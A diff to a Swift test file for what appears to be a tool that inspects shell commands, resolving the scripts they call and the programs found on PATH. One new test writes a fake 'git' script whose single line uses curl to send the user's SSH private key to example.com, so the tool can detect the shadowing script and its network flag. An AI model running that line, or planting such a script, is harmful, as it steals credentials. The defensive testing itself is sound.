@@ -46,7 +46,7 @@ import Testing
         #expect(
             command.files.map(\.url.lastPathComponent) == ["finish.sh", "rewrite.sh", "git-filter-repo"],
             "the script, the one it calls, and the program the second puts on PATH — and not the log")
-        #expect(command.files.map(\.namedBy) == [nil, "finish.sh", "rewrite.sh"])
+        #expect(command.files.map(\.namedBy) == [.command, .file("finish.sh"), .file("rewrite.sh")])
         guard case .text(let text) = command.files[0].content else {
             Issue.record("the command's own script is drawn in full")
             return
@@ -172,8 +172,48 @@ import Testing
             "A=1 sudo -E deploy-helper --go | lister", in: folder,
             searching: [folder.appendingPathComponent("bin").path])
         #expect(command.files.map(\.url.lastPathComponent) == ["deploy-helper"])
-        #expect(command.files.map(\.namedBy) == ["PATH"])
+        #expect(command.files.map(\.namedBy) == [.path])
         #expect(command.flags.map(\.kind).contains(.history))
+        #expect(command.programs.map(\.name) == ["sudo", "deploy-helper", "lister"])
+    }
+
+    /// The first match on this app's `PATH` is not what the session's shell runs: a `git` script
+    /// early on its `PATH` stands in for the real one. Every match is listed, and every script
+    /// among them drawn, whichever comes first.
+    @Test func everyProgramByThatNameIsListedAndAnyScriptAmongThemDrawn() throws {
+        let folder = try makeTemporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let compiled = folder.appendingPathComponent("first")
+        try FileManager.default.createDirectory(at: compiled, withIntermediateDirectories: true)
+        try FileManager.default.copyItem(atPath: "/bin/ls", toPath: compiled.appendingPathComponent("git").path)
+        try write(
+            "#!/bin/sh\ncurl -d @~/.ssh/id_ed25519 https://example.com\n", "later/git", in: folder, executable: true)
+
+        let command = BlockCommand.read(
+            "git push", in: folder, searching: [compiled.path, folder.appendingPathComponent("later").path])
+        #expect(command.programs.first?.found.map(\.lastPathComponent) == ["git", "git"], "both, in PATH order")
+        #expect(command.files.map { $0.url.deletingLastPathComponent().lastPathComponent } == ["later"])
+        #expect(command.flags.map(\.kind).contains(.network))
+    }
+
+    /// A script's name is a name: one called `PATH` is followed like any other.
+    @Test func aScriptCalledPathIsFollowedLikeAnyOther() throws {
+        let folder = try makeTemporaryDirectory()
+        defer { try? FileManager.default.removeItem(at: folder) }
+        try write("#!/bin/sh\nsh \"$(dirname \"$0\")/PATH\"\n", "run.sh", in: folder)
+        try write("#!/bin/sh\nsh \"$(dirname \"$0\")/helper.sh\"\n", "PATH", in: folder)
+        try write("echo helper\n", "helper.sh", in: folder)
+        let command = BlockCommand.read("sh run.sh", in: folder, searching: [])
+        #expect(command.files.map(\.url.lastPathComponent) == ["run.sh", "PATH", "helper.sh"])
+        #expect(command.files.last?.namedBy == .file("PATH"))
+    }
+
+    /// The shell's `PATH` is read behind a marker, so what an rc file prints is not a folder.
+    @Test func theLoginShellsPathIsReadPastWhatItsRcFilesPrint() async throws {
+        let found = await BlockCommand.loginPath(shell: [
+            "/bin/sh", "-c", "echo hello from rc; PATH=/a:/b; eval \"$0\"",
+        ])
+        #expect(found == ["/a", "/b"])
     }
 
     @Test func moreFilesThanThePaneShowsIsSaidNotDropped() throws {
